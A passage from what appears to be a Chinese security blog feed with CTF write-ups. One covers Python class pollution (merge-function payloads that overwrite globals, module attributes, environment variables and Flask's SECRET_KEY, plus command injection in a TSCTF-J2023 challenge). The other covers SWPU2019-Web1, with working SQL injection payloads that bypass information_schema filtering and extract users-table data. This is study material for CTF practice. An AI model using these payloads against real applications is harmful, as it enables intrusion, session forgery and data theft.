class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    target_secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;hello!&quot;</span></span><br><span class="line">instence = test()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;target_secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">merge(payload, instence)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target.target_secret)</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># hello!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>此时没有继承关系的类属性也被污染了</p><h2 id="已加载模块获取"><a href="#已加载模块获取" class="headerlink" title="已加载模块获取"></a>已加载模块获取</h2><p>test_1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;hahaha&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello, world!&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">tmp = a()</span><br><span class="line">merge(payload, a)</span><br><span class="line"><span class="built_in">print</span>(test_1.key)</span><br><span class="line"><span class="built_in">print</span>(test_1.target.secret)</span><br><span class="line"><span class="comment">#  输出</span></span><br><span class="line"><span class="comment"># hahaha</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><p>此时已经加载的模块也会被污染</p><h2 id="模块加载关系复杂"><a href="#模块加载关系复杂" class="headerlink" title="模块加载关系复杂"></a>模块加载关系复杂</h2><blockquote><p><code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p></blockquote><p>在<code>import sys</code>的程序中我们可以使用以下payload在复杂的模块导入关系中找到目标模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;target&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数形参默认值污染"><a href="#函数形参默认值污染" class="headerlink" title="函数形参默认值污染"></a>函数形参默认值污染</h2><p>主要用到<code>__defaults__和__kwdefaults__</code>两个内置属性</p><h3 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h3><blockquote><p><code>__defaults__</code>以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值即声明在 &#x2F; 后 * 前的参数默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参+键值形参</p></blockquote><h3 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h3><blockquote><p><code>__kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数键值形参的默认值, 即声明在* 后的参数默认值的键值对，从代码上来看，则是如下的效果：</p></blockquote><p>示例payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;func&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span>: (</span><br><span class="line">                    <span class="literal">True</span>,</span><br><span class="line">                ),</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过os-environ修改环境变量"><a href="#通过os-environ修改环境变量" class="headerlink" title="通过os.environ修改环境变量"></a>通过os.environ修改环境变量</h2><p>通过污染os.environ来修改环境变量LD_PROLOAD与上传.so劫持等扩展攻击面</p><p>这里看见了一个例子 通过os.environ导致命令注入:</p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.__class__.__init__.__globals__[<span class="string">&#x27;subprocess&#x27;</span>].os.environ.__setitem__(<span class="string">&#x27;COMSPEC&#x27;</span>, <span class="string">&quot;cmd /c calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="合并函数的真实例子—Pydash"><a href="#合并函数的真实例子—Pydash" class="headerlink" title="合并函数的真实例子—Pydash"></a>合并函数的真实例子—Pydash</h2><blockquote><p>Pydash的set_()和set_with()函数是递归合并函数的示例，我们可以利用它们来污染属性。</p><p>Pydash 函数使用点符号访问属性和项目而不是 JSON 格式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotAccessibleClass</span>: <span class="keyword">pass</span></span><br><span class="line">not_accessible_variable = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.not_accessible_variable&#x27;</span>,<span class="string">&#x27;Polluted variable&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(not_accessible_variable)</span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.NotAccessibleClass.__qualname__&#x27;</span>,<span class="string">&#x27;PollutedClass&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(NotAccessibleClass)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&gt; Polluted variable</span></span><br><span class="line"><span class="comment">#&gt; &lt;class &#x27;__main__.PollutedClass&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="flask相关"><a href="#flask相关" class="headerlink" title="flask相关"></a>flask相关</h2><h3 id="secret-key污染"><a href="#secret-key污染" class="headerlink" title="secret_key污染"></a>secret_key污染</h3><p>之前在客户端session的问题中接触过对flask session的伪造, secret_key就是一个必要的条件</p><p>可以通过覆盖原有的secret_key实现任意session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="TSCTF-J2023-Python-Not-Node"><a href="#TSCTF-J2023-Python-Not-Node" class="headerlink" title="TSCTF-J2023 Python Not Node"></a>TSCTF-J2023 Python Not Node</h3><p>找不到哪个靶场有这题, 简单看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">os.environ[<span class="string">&#x27;cmd&#x27;</span>] = <span class="string">&quot;ping -c 10 www.baidu.com&quot;</span> </span><br><span class="line">black_list = [<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Userinfo</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/define&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">define</span>():</span><br><span class="line">   <span class="keyword">if</span> request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(request.args)</span><br><span class="line">           usname = request.args[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">           info = request.args[<span class="string">&#x27;info&#x27;</span>]</span><br><span class="line">           origin_user = request.args[<span class="string">&#x27;origin_user&#x27;</span>]</span><br><span class="line">           user = &#123;usname: info&#125;</span><br><span class="line">           <span class="built_in">print</span>(<span class="built_in">type</span>(user))</span><br><span class="line">           pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;) </span><br><span class="line">           result = comexec().test_ping()</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;USER READY,JUST INSERT YOUR SEARCH RESULT&quot;</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;NOPE&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">       urls = request.args[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">           <span class="keyword">if</span> i <span class="keyword">in</span> urls:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;HACKER URL!&quot;</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           info = urllib.request.urlopen(urls).read().decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">           <span class="keyword">return</span> info</span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(e)</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;error&quot;</span> </span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Method error&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt; Welcome to this Challenge &lt;/html&gt; &lt;script&gt;alert(&#x27;focus on the </span></span><br><span class="line"><span class="string">source code&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app.run(debug=<span class="literal">True</span>, port=<span class="number">37333</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一个flask实现的程序</p><p>其中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;)</span><br><span class="line">result = comexec().test_ping()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br></pre></td></tr></table></figure><p>这里使用了pydash并且之后执行了环境变量中cmd存储的ping命令</p><p>因此就可以通过pydash来污染环境变量 到达命令注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_user=__class__.__init__.__globals__.os.environ&amp;info=Polluted</span><br></pre></td></tr></table></figure><p>至于这里的ssrf, 搬运一下大佬的话</p><blockquote><ul><li><p><strong>SSRF</strong></p><ul><li><p>常见的方式是8进制、16进制、302跳转等绕过，这些都被屏蔽了，最后题解说是简单的大小写绕过。</p><p>但是做题的时候没想到，所以使用的是<strong>localtest.me</strong>域名绕过，这是大佬买下的域名，访问时其实是重定向到本机，这样的域名还有很多。</p></li><li><p>还有一个点就是需要url编码避免参数的混淆解析，因为这里SSRF的域名也需要添加参数，所以我们要进行url编码。</p></li></ul></li></ul></blockquote><p>参考:</p><p><a href="https://xz.aliyun.com/t/13072">https://xz.aliyun.com/t/13072</a></p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python原链污染(类污染) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web1</title>
      <link href="/2024/02/26/SWPU2019-Web1/"/>
      <url>/2024/02/26/SWPU2019-Web1/</url>
      
        <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019-Web1"></a>SWPU2019-Web1</h1><p>在注册登录后广告申请处 广告名字段存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214413930.png" alt="image-20240226214413930"></p><p>禁了or, 可以使用group by测试出查询字段数</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214507781.png" alt="image-20240226214507781"></p><p>这里的难点在于禁了information_schema</p><p>关于无表名,列名注入:</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p><p>这里使用<strong>innodb_table_stats</strong>这张表来发现表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,group_concat(table_name),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1&#x27;=&#x27;1&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226220242765.png" alt="image-20240226220242765"></p><p>之后是无列名注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)from(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226225432773.png" alt="image-20240226225432773"></p><p><strong>总结</strong></p><h2 id="mysql绕过information-schema-无表名列名注入"><a href="#mysql绕过information-schema-无表名列名注入" class="headerlink" title="mysql绕过information_schema, 无表名列名注入"></a>mysql绕过information_schema, 无表名列名注入</h2><h3 id="无表名"><a href="#无表名" class="headerlink" title="无表名:"></a>无表名:</h3><h4 id="InnoDB引擎"><a href="#InnoDB引擎" class="headerlink" title="InnoDB引擎"></a>InnoDB引擎</h4><blockquote><p>从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL  5.6以上的版本中，InnoDb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(database_name) <span class="keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><h4 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h4><blockquote><p>在MySQL 5.7中，新增了sys系统数据库，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p></blockquote><h5 id="sys-schema-auto-increment-columns查询含有自增id的表"><a href="#sys-schema-auto-increment-columns查询含有自增id的表" class="headerlink" title="sys.schema_auto_increment_columns查询含有自增id的表"></a>sys.schema_auto_increment_columns查询含有自增id的表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="x-schema-table-statistics-with-buffer"><a href="#x-schema-table-statistics-with-buffer" class="headerlink" title="x$schema_table_statistics_with_buffer"></a>x$schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="无列名"><a href="#无列名" class="headerlink" title="无列名"></a>无列名</h3><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><p>原理: 将要查询的表中的内容导入到零时表中, 再从零时表中通过自定义的列名来查询出数据</p><p>示例:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">100</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>假设此时要查询所有的username, 就可以对第二个查询的字段进行子查询字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 